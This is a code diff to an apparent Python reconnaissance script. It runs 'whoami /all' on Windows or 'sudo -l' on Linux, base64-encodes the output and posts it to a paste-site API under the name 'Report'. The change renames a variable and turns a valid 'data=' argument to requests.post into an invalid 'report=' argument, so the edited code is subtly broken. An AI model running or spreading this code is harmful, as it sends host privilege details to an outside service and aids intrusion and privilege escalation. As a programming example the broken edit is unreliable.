@@ -5,29 +5,29 @@ import base64
 
 
 def wind():
-    data = []
+    report = []
     x = subprocess.Popen("whoami /all", stdout=subprocess.PIPE,
                          stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
     str, sterr = x.communicate()
     if sterr != b'':
-        data.append(sterr.decode())
+        report.append(sterr.decode())
     else:
-        data.append(str.decode())
-    data = "\n".join(data)
-    upload(base64.b64encode(data.encode()))
+        report.append(str.decode())
+    report = "\n".join(report)
+    upload(base64.b64encode(report.encode()))
 
 
 def linux():
-    data = []
+    report = []
     x = subprocess.Popen("sudo -l", stdout=subprocess.PIPE,
                          stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
     str, sterr = x.communicate()
     if sterr != b'':
-        data.append(sterr.decode())
+        report.append(sterr.decode())
     else:
-        data.append(str.decode())
-    data = "\n".join(data)
-    upload(base64.b64encode(data.encode()))
+        report.append(str.decode())
+    report = "\n".join(report)
+    upload(base64.b64encode(report.encode()))
 
 
 def upload(res):
@@ -37,7 +37,7 @@ def upload(res):
            'api_paste_code': res,
            'api_paste_name': "Report"
            }
-    send = requests.post(url, data=api)
+    send = requests.post(url, report=api)
 
 
 def main():
